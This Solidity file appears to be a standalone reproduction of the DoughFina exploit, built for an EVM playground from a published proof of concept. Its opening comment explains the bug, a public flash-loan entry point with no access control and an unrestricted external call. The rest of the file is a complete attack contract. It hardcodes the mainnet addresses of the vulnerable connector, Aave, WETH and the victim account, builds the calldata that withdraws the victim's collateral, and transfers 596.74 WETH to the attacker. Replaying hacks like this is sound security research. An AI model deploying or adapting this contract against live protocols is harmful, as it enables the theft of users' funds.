// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-DoughFina).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (ContractTest is Test; attacker = address(this); testExploit() calls attack()
// directly on the test itself), so there is nothing standalone to deploy. This
// contract is a faithful, self-contained copy of that inline attack (test/DoughFina_exp.sol)
// so the playground can deploy it and record run(). Logic and constants are copied
// verbatim from the Foundry test.
//
// Root cause: ConnectorDeleverageParaswap.flashloanReq() is a fully PUBLIC entry
// point with no access control. Anyone can trigger an Aave flash loan that makes
// the connector re-enter itself via executeOperation(), which decodes a
// caller-supplied `dsaAddress` (any victim's DoughDsa smart account) and a
// caller-supplied `swapData` "ParaSwap" payload. The connector withdraws that
// DSA's Aave collateral via IDoughDsa(dsaAddress).executeAction(...) and then
// performs an UNRESTRICTED external call — deloopAllCollaterals() does
// `paraSwapContract.call(paraswapCallData)` with no allowlist of paraSwapContract
// and no validation of the calldata. The attacker sets paraSwapContract = WETH and
// paraswapCallData = transferFrom(victimDSA, attacker, 596.74 WETH), stealing the
// just-withdrawn collateral. The downstream guards in DoughDsa.executeAction and
// AaveActions.executeAaveAction only check `msg.sender == registered connector` —
// a classic confused deputy that never verifies the connector was authorized to
// touch THIS particular DSA.

interface IERC20DF {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IAaveFlashloanDF {
    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf)
        external
        returns (uint256);
}

interface ConnectorDeleverageParaswapDF {
    function flashloanReq(
        bool _opt,
        address[] memory debtTokens,
        uint256[] memory debtAmounts,
        uint256[] memory debtRateMode,
        address[] memory collateralTokens,
        uint256[] memory collateralAmounts,
        bytes[] memory swapData
    ) external;
}

contract DoughFinaDrain {
    IERC20DF constant USDC = IERC20DF(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ConnectorDeleverageParaswapDF constant vulnContract =
        ConnectorDeleverageParaswapDF(0x9f54e8eAa9658316Bb8006E03FFF1cb191AafBE6);
    IAaveFlashloanDF constant aave = IAaveFlashloanDF(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address constant onBehalfOf = 0x534a3bb1eCB886cE9E7632e33D97BF22f838d085; // victim DoughDsa
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Attacker (this contract) is pre-funded with 80,000,000 USDC via the config's
    // `dealToken` setup step (mirrors the Foundry `deal(address(USDC), address(this),
    // 80_000_000 ether)` — that huge USDC balance is never actually needed to cover
    // the flash-loan premium; it just mirrors the test's over-provisioning).
    function run() external {
        USDC.approve(address(aave), type(uint256).max);

        // Step 1: repay the victim DSA's Aave USDC debt out of the attacker's own
        // pocket, unlocking the 596.74 WETH collateral (Aave lets anyone repay
        // another account's debt).
        aave.repay(address(USDC), 938_566_826_811, 2, onBehalfOf);

        // Step 2: pre-fund the connector with a small USDC buffer for the upcoming
        // flash-loan premium.
        USDC.transfer(address(vulnContract), 6_000_000);

        address[] memory debtTokens = new address[](1);
        debtTokens[0] = address(USDC);
        uint256[] memory debtAmounts = new uint256[](1);
        debtAmounts[0] = 5_000_000;
        uint256[] memory debtRateMode = new uint256[](1);
        debtRateMode[0] = 0;
        address[] memory collateralTokens = new address[](0);
        uint256[] memory collateralAmounts = new uint256[](0);

        bytes[] memory swapData = new bytes[](2);

        // swapData[0]: decoded inside executeOperation -> extractAllCollaterals ->
        // IDoughDsa(onBehalfOf).executeAction(22, USDC, 5e6, WETH, 596.744648...e18, actionId=1)
        // withdraws the victim DSA's full aWETH collateral into the DSA itself.
        swapData[0] = abi.encode(
            address(USDC),
            address(USDC),
            type(uint128).max,
            type(uint128).max,
            onBehalfOf,
            onBehalfOf,
            abi.encodeWithSelector(
                bytes4(0x75b4b22d), 22, address(USDC), 5_000_000, WETH, 596_744_648_055_377_423_623, 2
            )
        );

        // swapData[1]: decoded inside deloopAllCollaterals -> the "ParaSwap" call is
        // actually paraSwapContract = WETH, calldata = transferFrom(onBehalfOf, this,
        // 596.74 WETH) — the unrestricted arbitrary call that steals the
        // just-withdrawn collateral straight out of the victim DSA.
        swapData[1] = abi.encode(
            address(USDC),
            address(USDC),
            type(uint128).max,
            type(uint128).max,
            WETH,
            address(aave),
            abi.encodeWithSelector(bytes4(0x23b872dd), onBehalfOf, address(this), 596_744_648_055_377_423_623)
        );

        vulnContract.flashloanReq(
            false, debtTokens, debtAmounts, debtRateMode, collateralTokens, collateralAmounts, swapData
        );
    }

    // ConnectorDeleverageParaswap calls this back during the deloop (mirrors the
    // test's empty executeAction stub — never actually reached in this attack path
    // since the theft goes through the arbitrary .call in swapData[1], but kept for
    // ABI parity with the original inline test contract).
    function executeAction(
        uint256, /* _connectorId */
        address, /* _tokenIn */
        uint256, /* _inAmount */
        address, /* _tokenOut */
        uint256, /* _outAmount */
        uint256 /* _actionId */
    ) external payable {}

    receive() external payable {}
}
